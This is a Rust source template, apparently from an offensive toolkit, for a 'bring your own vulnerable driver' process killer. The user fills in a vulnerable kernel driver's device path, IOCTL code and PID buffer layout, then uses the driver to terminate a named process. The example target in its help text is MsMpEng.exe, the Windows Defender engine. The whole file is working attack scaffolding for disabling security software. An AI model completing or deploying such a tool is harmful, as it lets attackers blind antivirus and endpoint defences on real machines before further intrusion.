// Tier-1 BYOVD killer template — fill from the DRIVER_PROFILE you extracted.
// Copy to <Driver>-Killer/src/main.rs, replace every <PLACEHOLDER>, delete the
// overrides you don't need. See references/BYOVD_LIB.md for build_ioctl_input
// recipes and the trait-override cheatsheet.

use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration — <DRIVER_NAME> (<VENDOR>)
//   Device : \\.\<DEVICE>          (from IoCreateSymbolicLink, Step 2)
//   IOCTL  : 0x<IOCTL>             (from the dispatch branch, Step 3)
//   Buffer : <describe PID offset/width/encoding>   (from the sink, Step 5)
//   Auth   : <the gap that makes it reachable>      (Step 6)
//   SHA256 : <hash>   LOLDrivers: <url or "not listed">
// ============================================================================

struct TargetDriver;

impl DriverConfig for TargetDriver {
    fn driver_name(&self) -> &str {
        "<SERVICE_NAME>"
    }

    fn driver_file(&self) -> &str {
        "<DRIVER_FILE>.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\<DEVICE>"
    }

    fn ioctl_code(&self) -> u32 {
        0x<IOCTL>
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        // EXAMPLE: PID DWORD at offset +0. Replace with the exact layout
        // you reversed. Common variants in references/BYOVD_LIB.md.
        pid.to_ne_bytes().to_vec()
    }

    // ---- optional overrides: keep only the ones this driver needs ----------
    // fn device_access(&self) -> u32 {
    //     use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE};
    //     GENERIC_READ | GENERIC_WRITE
    // }
    // fn ioctl_output_size(&self) -> usize { 4 }
    // fn skip_unload(&self) -> bool { true }            // driver BSODs on unload
    // fn ignore_ioctl_error(&self) -> bool { true }     // reports error on success
    // fn preflight_check(&self) -> Result<()> {
    //     byovd_lib::ensure_running_as_local_system()   // driver is LocalSystem-gated
    // }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "<DRIVER_NAME>-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using <DRIVER_NAME> (<VENDOR>)")]
struct Cli {
    /// Target process name (e.g., notepad.exe, MsMpEng.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&TargetDriver, &cli.process_name, None)
}
